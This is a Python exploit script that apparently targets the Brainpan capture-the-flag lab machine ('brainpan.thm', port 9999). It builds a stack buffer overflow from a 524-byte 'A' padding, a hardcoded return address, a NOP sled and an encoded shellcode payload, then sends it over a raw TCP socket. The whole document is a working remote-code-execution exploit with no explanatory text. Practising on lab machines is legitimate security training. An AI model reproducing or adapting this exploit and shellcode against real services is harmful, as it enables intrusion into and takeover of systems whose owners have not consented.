#!/usr/bin/python
import sys, socket
ip_addr='brainpan.thm'
#ip_addr='192.168.0.130'
port=9999
payload = (
b"\xda\xc7\xd9\x74\x24\xf4\x5e\xb8\x24\x24\xdf\x92\x31\xc9"
b"\xb1\x59\x83\xee\xfc\x31\x46\x15\x03\x46\x15\xc6\xd1\x23"
b"\x7a\x89\x1a\xdc\x7b\xf5\x93\x39\x4a\x27\xc7\x4a\xff\xf7"
b"\x83\x1f\x0c\x7c\xc1\x8b\x3d\x7d\xe9\x04\x77\xa7\x7d\x18"
b"\xa0\x96\x41\x71\x8c\xb9\x3d\x88\xc1\x19\x7f\x43\x14\x58"
b"\xb8\x15\x52\xb5\x14\xf1\x17\x1b\x89\x76\x65\xa7\xa8\x58"
b"\xe1\x97\xd2\xdd\x36\x63\x6f\xdf\x66\xdb\xe4\x97\x9e\x50"
b"\xa2\x07\x9e\xb5\xd6\x81\xd4\x05\xe8\xee\x5c\xfe\x3e\x9a"
b"\x5e\xd6\x0e\x5c\xa1\x19\x7d\xf0\x23\x62\x46\xe8\x51\x98"
b"\xb4\x95\x61\x5b\xc6\x41\xe7\x7b\x60\x01\x5f\x5f\x90\xc6"
b"\x06\x14\x9e\xa3\x4d\x72\x83\x32\x81\x09\xbf\xbf\x24\xdd"
b"\x49\xfb\x02\xf9\x12\x5f\x2a\x58\xff\x0e\x53\xba\xa7\xef"
b"\xf1\xb1\x4a\xf9\x86\x3a\x95\x06\xdb\xac\x59\xcb\xe4\x2c"
b"\xf6\x5c\x96\x1e\x59\xf7\x30\x12\x12\xd1\xc7\x23\x34\xe2"
b"\x18\x8b\x55\x1c\x99\xeb\x7c\xdb\xcd\xbb\x16\xca\x6d\x50"
b"\xe7\xf3\xbb\xcc\xed\x63\x4e\x14\xed\x0c\x26\x16\x11\xe2"
b"\xea\x9f\xf7\x54\x43\xcf\xa7\x14\x33\xaf\x17\xfd\x59\x20"
b"\x47\x1d\x62\xeb\xe0\xb4\x8d\x45\x58\x21\x37\xcc\x12\xd0"
b"\xb8\xdb\x5e\xd2\x33\xe9\x9f\x9d\xb3\x98\xb3\xca\xa3\x62"
b"\x4c\x0b\x46\x62\x26\x0f\xc0\x35\xde\x0d\x35\x71\x41\xed"
b"\x10\x02\x86\x11\xe5\x32\xfc\x24\x73\x7a\x6a\x49\x93\x7a"
b"\x6a\x1f\xf9\x7a\x02\xc7\x59\x29\x37\x08\x74\x5e\xe4\x9d"
b"\x77\x36\x58\x35\x10\xb4\x87\x71\xbf\x47\xe2\x01\xb8\xb7"
b"\x70\x2e\x61\xdf\x8a\x6e\x91\x1f\xe1\x6e\xc1\x77\xfe\x41"
b"\xee\xb7\xff\x4b\xa7\xdf\x8a\x1d\x05\x7e\x8a\x37\xcb\xde"
b"\x8b\xb4\xd0\xd1\xf6\xb5\xe7\x12\x07\xdc\x83\x13\x07\xe0"
b"\xb5\x28\xd1\xd9\xc3\x6f\xe1\x5d\xdb\xda\x44\xf7\x76\x24"
b"\xda\x07\x53"
)

offset=524
overflow = b"A" * offset
padding = b"\x90" * 16
retn = b"\xf3\x12\x17\x31"
shellcode= overflow  + retn + padding + payload  + b"\r\n"

try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		print('connecting')
		print('sending payload')
		s.connect((ip_addr,port))
		print('connected')
		s.send(shellcode)
		s.close()
		print('closed')
except Exception as err:
		print("Error connecting to server" ,err)
		sys.exit()
